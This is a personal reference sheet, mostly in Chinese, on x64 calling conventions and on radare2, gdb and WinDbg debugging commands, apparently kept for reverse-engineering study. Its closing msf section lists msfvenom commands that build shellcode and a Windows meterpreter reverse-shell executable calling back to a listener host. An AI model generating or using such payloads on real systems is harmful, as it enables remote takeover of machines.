

# 调用规约

- Linux x64：
  * TLDR: rdi, rsi, rdx, rcx, r8, r9
  * User-level applications use as integer registers for passing the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9. The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9. [link](https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-and-user-space-f)

- Windows x64:
  * rcx, rdx, r8, r9, then stack
  * https://docs.microsoft.com/zh-cn/cpp/build/x64-calling-convention?view=vs-2019

```c++
func1(int a, int b, int c, int d, int e, int f);
// a in RCX, b in RDX, c in R8, d in R9, f then e pushed on stack
```
- Windows x86:
  - esp+4, esp+8

# r2 (radare2)

- `aaaa` 分析
- `afl` 列出函数
  * `afl~main` 列出包含 main 的函数
- `s main` 切换(seek)当前地址为 main
- `pdf` 打印当前的汇编
- 任意命令加 `?` 提供 help 信息，比如 `pd?`


# gdb

- r 运行，run
- c 继续，continue
- info reg 查看寄存器
- br *main 在main函数下断点
- br src/ss.c:123 在文件 ss.c:123 处下断点
- del 1 删除断点1
- diable 1 禁用断点1
- enable 1 启用断点1
- info br 查看断点
- x/4gx 0xdeadbeef 检查内存
  * x/4wx 控制每行的列数
  * x/2wx $rax 
- x/10i $pc 打印当前汇编
  * x/10i $rip rip/eip/pc都可以
  * x/-10i $rip 可以倒着来
- n(next) 源码级别step over
- s(step) 源码级别step in
- si(stepi) 汇编级别step in
- ni(nexti) 汇编级别step over
- starti 开始时断下（找不到入口/entry时）


* [gdb和lldb的对比](https://lldb.llvm.org/use/map.html)
* [gdb online docs](https://sourceware.org/gdb/onlinedocs/gdb/)


# windbg
- `sxe ld:xx.dll` dll加载时断下
- `* blabla` 注释
- `u $exentry` 查看入口/entry
- `x ntdll!D*` 查看符号
- `p` step over
- `t` (trace) step into

## windbg basic
- `g` 运行
- `r` 查看所有寄存器
  - `r rax` 查看 rax
- `u` 查看当前eip的反汇编
- 直接按回车执行上一条命令
- 分号做分割，可以在一行执行多条命令
- `ctrl + break` 强制停止命令

windbg中有一些伪寄存器，最常见的就是memory界面默认显示的 `@$scopeip`，表示当前 eip

有如下这些常用伪寄存器，完整列表见[官网](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/pseudo-register-syntax)

| pseudo register | desc |
| --------------- | ---- |
| `$exentry`|   入口点|
| `$proc`   |   进程结构(EPROCESS)指针 |
| `$peb`   |   进程PEB(process environment block)结构 |
| `$teb`   |   进程TEB(thread environment block)结构 |


### 执行

`p` 命令：

```
[~Thread] p[r] [= StartAddress] [Count] ["Command"] 
```

- 加 `r` 禁止寄存器显示
- 默认从 eip 开始执行，加 `= StartAddress` 从该地址开始执行
- 加 `Count` 表示执行的行数或者指令数（？如何区分），默认是 1
  - 切换汇编模式：`l-t`
  - 切换源码模式：`l+t` （更多：[l+,l-指令文档](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/l---l---set-source-options-)）
- 加 `"Command"` 表示指令数执行完后需要执行的命令


t命令和p命令类似，区别是：t是step in，p是step over

- `pa|ta [r] [=StartAddress] StopAddress` 执行到指定地址
- `pc|tc [r] [=StratAddress] [Count]` 执行到下一个函数调用
- `tb [r] [=StartAddress] [Count]` 执行到下一个分支

### 断点

```
bp[ID] [Options] [Address [Passes]] ["Command String"]
bu[ID] [Options] [Address [Passes]] ["Command String"]
bm[Options]  SymbolPattern [Passes] ["Command String"]

; 硬件断点
ba [ID] Access Size [Option] [Address[Passes]] ["Command String"]
```

- `bp` 软件断点
- `ba` 硬件断点
  - `ba r1 0x401000` 读0x401000 >= 1bytes
- `bu` 未加载模块断点
- `bm` 符号特征断点 (Set Symbol Breakpoint)
  - `bm msvcr80d!print*`
- `bl` 列举断点
- `bc` 清除断点
- `bd/be` 禁用/启用断点

TODO: 条件断点

### 栈回溯


## more to learn
- https://medium.com/@yardenshafir2/windbg-the-fun-way-part-1-2e4978791f9b new way
- https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2020/07/27/debugging_malwarewi-hk5u.html log
- https://github.com/hugsy/defcon_27_windbg_workshop/blob/master/windbg_cheatsheet.md must memorize
- https://bbs.pediy.com/thread-250670.htm


# msf

shellcode

```sh
msfvenom -p windows/x64/exec CMD=calc.exe   -a x64 --platform win -f raw -o calc64.raw

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.11 LPORT=1111 -f exe > shell.exe

# 常用payload
payload/windows/x64/meterpreter_bind_tcp

```

